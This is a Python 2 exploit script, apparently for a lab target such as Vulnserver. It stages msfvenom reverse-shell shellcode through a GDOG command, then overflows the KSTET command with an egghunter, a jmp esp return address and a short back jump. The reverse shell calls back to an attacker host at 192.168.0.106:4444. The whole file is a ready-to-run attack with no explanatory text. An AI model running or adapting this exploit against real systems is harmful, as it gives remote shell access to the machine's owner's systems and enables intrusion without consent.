import os
import socket
import sys

host= "192.168.0.100"
port= 9999

#32 byte egghunter "GOUT"
egghunt = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x47\x4f\x55\x54\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
)

#msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST="192.168.0.106" EXITFUNC=thread -b "\x00" -f 
payload = (
"\xbd\xd9\xf9\xf2\xca\xd9\xc6\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x83\xc2\x04\x31\x6a\x0e\x03\xb3\xf7\x10\x3f\xbf\xe0\x57"
"\xc0\x3f\xf1\x37\x48\xda\xc0\x77\x2e\xaf\x73\x48\x24\xfd\x7f"
"\x23\x68\x15\x0b\x41\xa5\x1a\xbc\xec\x93\x15\x3d\x5c\xe7\x34"
"\xbd\x9f\x34\x96\xfc\x6f\x49\xd7\x39\x8d\xa0\x85\x92\xd9\x17"
"\x39\x96\x94\xab\xb2\xe4\x39\xac\x27\xbc\x38\x9d\xf6\xb6\x62"
"\x3d\xf9\x1b\x1f\x74\xe1\x78\x1a\xce\x9a\x4b\xd0\xd1\x4a\x82"
"\x19\x7d\xb3\x2a\xe8\x7f\xf4\x8d\x13\x0a\x0c\xee\xae\x0d\xcb"
"\x8c\x74\x9b\xcf\x37\xfe\x3b\x2b\xc9\xd3\xda\xb8\xc5\x98\xa9"
"\xe6\xc9\x1f\x7d\x9d\xf6\x94\x80\x71\x7f\xee\xa6\x55\xdb\xb4"
"\xc7\xcc\x81\x1b\xf7\x0e\x6a\xc3\x5d\x45\x87\x10\xec\x04\xc0"
"\xd5\xdd\xb6\x10\x72\x55\xc5\x22\xdd\xcd\x41\x0f\x96\xcb\x96"
"\x70\x8d\xac\x08\x8f\x2e\xcd\x01\x54\x7a\x9d\x39\x7d\x03\x76"
"\xb9\x82\xd6\xd9\xe9\x2c\x89\x99\x59\x8d\x79\x72\xb3\x02\xa5"
"\x62\xbc\xc8\xce\x09\x47\x9b\x30\x65\x47\x31\xd9\x74\x47\xd4"
"\x45\xf0\xa1\xbc\x65\x54\x7a\x29\x1f\xfd\xf0\xc8\xe0\x2b\x7d"
"\xca\x6b\xd8\x82\x85\x9b\x95\x90\x72\x6c\xe0\xca\xd5\x73\xde"
"\x62\xb9\xe6\x85\x72\xb4\x1a\x12\x25\x91\xed\x6b\xa3\x0f\x57"
"\xc2\xd1\xcd\x01\x2d\x51\x0a\xf2\xb0\x58\xdf\x4e\x97\x4a\x19"
"\x4e\x93\x3e\xf5\x19\x4d\xe8\xb3\xf3\x3f\x42\x6a\xaf\xe9\x02"
"\xeb\x83\x29\x54\xf4\xc9\xdf\xb8\x45\xa4\x99\xc7\x6a\x20\x2e"
"\xb0\x96\xd0\xd1\x6b\x13\xf0\x33\xb9\x6e\x99\xed\x28\xd3\xc4"
"\x0d\x87\x10\xf1\x8d\x2d\xe9\x06\x8d\x44\xec\x43\x09\xb5\x9c"
"\xdc\xfc\xb9\x33\xdc\xd4"
)
buffer = 'GDOG ' + "GOUTGOUT"+payload

#jmp esp \xaf\x11\x50\x62
buffer2 = 'KSTET ' + "A" * 20+"\x90"*9+"\x83\xec\x40"+ egghunt+"\x90"*6 + "\xaf\x11\x50\x62"

#short negative jump -49 bytes
buffer2 += "\xeb\xcf"
buffer2 += "C"*498
conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
conn.connect((host,port))
print conn.recv(1024)
conn.send((buffer))
print conn.recv(1024)
conn.send((buffer2))
print conn.recv(1024)

conn.send('EXIT\r\n')
print conn.recv(1024)
conn.close()

